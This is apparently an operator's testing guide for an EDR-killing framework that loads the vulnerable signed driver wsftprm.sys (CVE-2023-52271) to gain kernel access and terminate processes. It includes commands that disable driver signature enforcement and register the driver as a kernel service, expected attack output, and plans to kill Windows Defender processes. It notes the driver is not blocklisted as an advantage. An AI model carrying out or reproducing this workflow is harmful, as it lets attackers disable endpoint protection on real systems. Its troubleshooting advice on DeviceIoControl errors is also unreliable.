# BYOVD Testing Guide - vulndriver.sys
**Date:** February 10, 2026  
**Target:** Windows 10 VM (Test Mode enabled)

## Pre-Test Checklist

### 1. VM Preparation (Already Complete ✅)
- [x] Windows 10 VM with Test Mode enabled
- [x] DSE disabled (`bcdedit /set nointegritychecks on`)
- [x] Test signing enabled (`bcdedit /set testsigning on`)
- [x] Clean baseline snapshot created
- [x] Administrator privileges confirmed

### 2. Driver Files Required

**On Linux Host:**
```bash
# Verify driver exists
ls -la /home/bipin/german-project/AV-EDR-Killer/vulndriver.sys

# Copy to a transfer location (shared folder or USB)
cp /home/bipin/german-project/AV-EDR-Killer/vulndriver.sys \
   /home/bipin/german-project/EDR-Adaptive-Framework/vulndriver.sys
```

**Transfer to Windows VM:**
- Copy `vulndriver.sys` to `C:\EDR-Test\vulndriver.sys`
- Verify file integrity (should be ~10-50KB)

---

## Testing Approach

### Option 1: Manual Driver Testing (Quick Validation)

**Purpose:** Verify driver loads before integration test

**Steps on Windows VM:**

```cmd
REM 1. Open Command Prompt as Administrator
cd C:\EDR-Test

REM 2. Create and start service
sc create WarsawPMTest type=kernel start=demand binPath="C:\EDR-Test\vulndriver.sys"
sc start WarsawPMTest

REM 3. Verify driver loaded
sc query WarsawPMTest

REM Expected output: STATE = RUNNING

REM 4. Test device accessibility (PowerShell)
powershell -Command "$h = [System.IO.File]::OpenHandle('\\.\Warsaw_PM', [System.IO.FileAccess]::ReadWrite); $h.Close()"

REM If no error, device is accessible ✅

REM 5. Cleanup
sc stop WarsawPMTest
sc delete WarsawPMTest
```

### Option 2: Full Framework Test (After Build)

**Purpose:** Test complete BYOVD exploit via the framework

**Prerequisites:**
- Framework compiled for Windows
- Binary copied to VM (`edr_framework.exe`)

**Steps:**
```cmd
REM Run the framework
cd C:\EDR-Test
edr_framework.exe

REM Select BYOVD technique from menu
REM Provide driver path: C:\EDR-Test\vulndriver.sys
REM Execute and observe output
```

---

## Expected Output (Success Scenario)

```
========================================
  BYOVD Attack - vulndriver.sys
  CVE-2023-52271 (wsftprm.sys)
========================================

[1/6] Enabling SeLoadDriverPrivilege...
[+] SeLoadDriverPrivilege enabled

[2/6] Deploying driver...
[*] Deploying driver from: C:\EDR-Test\vulndriver.sys
[*] Target location: C:\Users\...\AppData\Local\Temp\vulndriver.sys
[+] Driver deployed successfully

[3/6] Creating driver service...
[*] Creating driver service: WarsawPMDriver
[+] Service created/opened successfully

[4/6] Starting driver...
[*] Starting driver...
[+] Driver started successfully!

[5/6] Opening device handle...
[*] Opening device handle to Warsaw_PM...
[+] Device handle opened successfully (Warsaw_PM)!

[6/6] Testing kernel access...
[*] Testing kernel-level access via IOCTL...
[+] Kernel-level access confirmed!
[+] Device handle: 0x...
[+] Ready to terminate processes via ZwTerminateProcess

========================================
  ✓ BYOVD ATTACK SUCCESSFUL!
  Ready to terminate EDR processes
========================================
```

---

## Testing Process Termination (Advanced)

**⚠️ WARNING:** Only test on disposable processes, never system-critical ones!

### Test with Notepad

```cmd
REM 1. Start Notepad
start notepad.exe

REM 2. Get PID
tasklist | findstr notepad.exe
REM Example output: notepad.exe    5432 Console    1    12,345 K

REM 3. Run framework with target PID
edr_framework.exe --technique byovd --driver "C:\EDR-Test\vulndriver.sys" --target_pid 5432

REM 4. Verify Notepad was terminated
tasklist | findstr notepad.exe
REM Should show nothing if successful ✅
```

---

## Troubleshooting

### Error: "Failed to start driver"

**Possible Causes:**
- Driver signature enforcement still enabled
- Driver file corrupted
- Wrong architecture (x64 vs x86)

**Solutions:**
```cmd
REM Re-verify Test Mode
bcdedit /enum | findstr -i testsigning
REM Should show: testsigning = Yes

REM Check driver architecture
dumpbin /headers C:\EDR-Test\vulndriver.sys | findstr machine
REM Should match OS architecture
```

### Error: "Failed to open device handle"

**Possible Causes:**
- Driver started but device object not created
- Device name mismatch

**Solutions:**
```powershell
# List all devices
Get-ChildItem \\.\* -ErrorAction SilentlyContinue | Select-Object Name

# Look for Warsaw_PM or similar
```

### Error: "DeviceIoControl failed: 0x00000001"

**Meaning:** Operation completed successfully (weird Windows quirk)  
**Action:** Ignore this error if process was terminated

### BSOD / System Crash

**Recovery:**
```bash
# On Linux host
VBoxManage controlvm "windows10" poweroff
VBoxManage snapshot "windows10" restore "Clean-Baseline"
VBoxManage startvm "windows10"
```

---

## Performance Benchmarks

| Metric | Expected Value |
|--------|---------------|
| Driver load time | < 2 seconds |
| Device open time | < 100ms |
| Process termination | < 50ms |
| Cleanup time | < 1 second |

---

## Detection Considerations

### What EDRs Will Detect:

1. **Service Creation** - ETW events (Event ID 7045)
2. **Driver Load** - Sysmon Event ID 6
3. **DeviceIoControl calls** - Kernel callbacks (if hooked)
4. **Process termination** - Anomalous termination from kernel

### What Makes This BETTER Than RTCore64:

1. ✅ **Not blocklisted** - Defender won't auto-quarantine
2. ✅ **Less known** - Not in public exploit databases
3. ✅ **Simpler attack** - Single IOCTL vs. complex memory manipulation
4. ✅ **Valid signature** - TPZ SOLUCOES DIGITAIS LTDA

---

## Next Steps After Successful Test

1. **Document Results:**
   - Screenshot of successful execution
   - Timing metrics
   - Any errors encountered

2. **Test Against Defender:**
   - Enable Windows Defender
   - Attempt to terminate Defender processes
   - Document bypass success rate

3. **Prepare Demo:**
   - Create slide showing attack flow
   - Record video of execution
   - Prepare explanation of CVE-2023-52271

4. **Build Next Technique:**
   - PPL Bypass (extends BYOVD)
   - Direct Syscalls
   - DLL Side-Loading

---

## Build Instructions (Next Task)

### Cross-Compile from Linux (Preferred)

```bash
# Install MinGW-w64
sudo apt install mingw-w64

# Build for Windows
cd /home/bipin/german-project/EDR-Adaptive-Framework
mkdir -p build-windows && cd build-windows
cmake -DCMAKE_TOOLCHAIN_FILE=../toolchain-mingw64.cmake ..
cmake --build . --config Release

# Transfer build-windows/edr_framework.exe to VM
```

### Build on Windows VM (Alternative)

```cmd
REM Install Visual Studio 2022 Community
REM Install "Desktop development with C++"

REM Clone repo to VM
cd C:\
git clone [repo_url] EDR-Framework
cd EDR-Framework

REM Build
mkdir build && cd build
cmake ..
cmake --build . --config Release

REM Binary: build\Release\edr_framework.exe
```

---

**Testing Preparation Complete!**  
**Next Session:** Build framework and execute first test on Windows 10 VM
